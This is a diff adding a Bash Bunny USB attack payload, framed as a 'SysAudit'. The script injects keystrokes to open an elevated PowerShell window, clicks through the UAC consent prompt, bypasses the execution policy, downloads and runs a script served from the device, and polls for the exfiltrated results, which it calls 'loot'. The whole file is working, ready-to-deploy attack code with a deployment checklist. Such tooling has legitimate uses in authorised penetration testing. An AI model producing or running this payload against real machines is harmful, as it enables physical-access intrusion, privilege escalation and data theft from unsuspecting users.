@@ -1,0 +1,114 @@
+#!/bin/bash
+# ================================================================
+#  Payload     : SysAudit Target Audit
+#  Description : Bash Bunny payload — injects keystrokes to open
+#                an elevated PowerShell session, downloads and runs
+#                SysAudit.ps1 via a staged runner, compresses the
+#                audit output, and exfils the ZIP back to the Bunny
+#                over RNDIS_ETHERNET.
+#  Target OS   : Windows 7 SP1+ (PowerShell 3.0+ / .NET 4.5+ required)
+#  Author      : [Operator]
+#  Device      : Bash Bunny Mk I / Mk II
+#
+#  Pre-deployment checklist:
+#    1. Place SysAudit.ps1 in this payload directory (or symlink/copy
+#       from /root/scripts/SysAudit.ps1 — the script auto-detects)
+#    2. Ensure runner.ps1 and receive.py are in this payload directory
+#    3. Copy the entire directory to /payloads/switch1/ (or switch2/)
+#    4. Insert Bunny in the chosen attack switch position
+#
+#  Execution flow:
+#    RNDIS_ETHERNET: Bunny IP 172.16.64.1; target gets 172.16.64.X
+#    Python HTTP server (port 80, this device):
+#      GET /SysAudit.ps1  — served to runner.ps1
+#      GET /runner.ps1    — served to target PowerShell
+#      POST /upload       — receives audit ZIP from target
+#    HID sequence:
+#      Win+R → "powershell" → Ctrl+Shift+Enter (UAC elevation) → Alt+Y
+#    PS command typed into the elevated window (no PS $ vars, static paths):
+#      Set-ExecutionPolicy Bypass (process scope)
+#      Download runner.ps1 → C:\Windows\Temp\bb.ps1
+#      Execute bb.ps1 (audit → compress → POST → cleanup)
+#    Bash polls $LOOT_DIR for audit_results.zip (up to 5 minutes)
+# ================================================================
+
+LED SETUP
+ATTACKMODE HID RNDIS_ETHERNET
+
+# Resolve paths
+PAYLOAD_DIR="$(dirname "$(readlink -f "$0")")"
+SYSAUDIT_PS1="${PAYLOAD_DIR}/SysAudit.ps1"
+
+# Fall back to operator scripts directory if not copied alongside payload
+if [ ! -f "$SYSAUDIT_PS1" ]; then
+    SYSAUDIT_PS1="/root/scripts/SysAudit.ps1"
+fi
+
+SERVE_DIR="/tmp/bb_serve_$$"
+mkdir -p "$SERVE_DIR"
+mkdir -p "$LOOT_DIR"
+
+# Stage files for HTTP serving
+cp "$SYSAUDIT_PS1"                    "$SERVE_DIR/SysAudit.ps1"
+cp "${PAYLOAD_DIR}/runner.ps1"        "$SERVE_DIR/runner.ps1"
+
+# Start HTTP server: serves staged files (GET) and receives loot (POST /upload)
+python3 "${PAYLOAD_DIR}/receive.py" \
+    --serve-dir "$SERVE_DIR" \
+    --loot-dir  "$LOOT_DIR"  \
+    --port 80 &
+SERVER_PID=$!
+
+# Allow server and RNDIS interface to fully initialise
+sleep 3
+
+# ---- HID injection --------------------------------------------------
+LED ATTACK
+
+# Open Run dialog (Win+R)
+Q GUI r
+Q DELAY 600
+
+# Type "powershell" then Ctrl+Shift+Enter to request UAC elevation
+Q STRING powershell
+Q DELAY 300
+Q CTRL SHIFT ENTER
+Q DELAY 2500
+
+# Accept the UAC consent prompt — Alt+Y focuses "Yes" on English Windows.
+# Increase the preceding DELAY if the target machine is slow.
+Q ALT y
+Q DELAY 2500
+
+# Compound PS command typed into the elevated window.
+# Single-quoted in bash so ; and & are not interpreted by the shell.
+# No PS $variables used — all paths are static strings — so bash
+# cannot accidentally expand them before Q receives the line.
+#
+# Step 1: Bypass execution policy for this process only.
+# Step 2: Download runner.ps1 from the Bunny to a writable temp path.
+# Step 3: Execute runner.ps1 (audit → compress → exfil → cleanup).
+Q STRING 'Set-ExecutionPolicy Bypass -Scope Process -Force; iwr http://172.16.64.1/runner.ps1 -OutFile C:\Windows\Temp\bb.ps1 -UseBasicParsing; & C:\Windows\Temp\bb.ps1'
+Q ENTER
+
+# ---- Wait for loot --------------------------------------------------
+# Poll for the exfil ZIP (max 5 minutes / 300 seconds, 5-second ticks)
+TIMEOUT=300
+ELAPSED=0
+LOOT_FILE="${LOOT_DIR}/audit_results.zip"
+
+while [ ! -f "$LOOT_FILE" ] && [ "$ELAPSED" -lt "$TIMEOUT" ]; do
+    sleep 5
+    ELAPSED=$((ELAPSED + 5))
+done
+
+# ---- Cleanup --------------------------------------------------------
+kill "$SERVER_PID" 2>/dev/null
+rm -rf "$SERVE_DIR"
+
+# ---- Final LED ------------------------------------------------------
+if [ -f "$LOOT_FILE" ]; then
+    LED FINISH
+else
+    LED FAIL
+fi
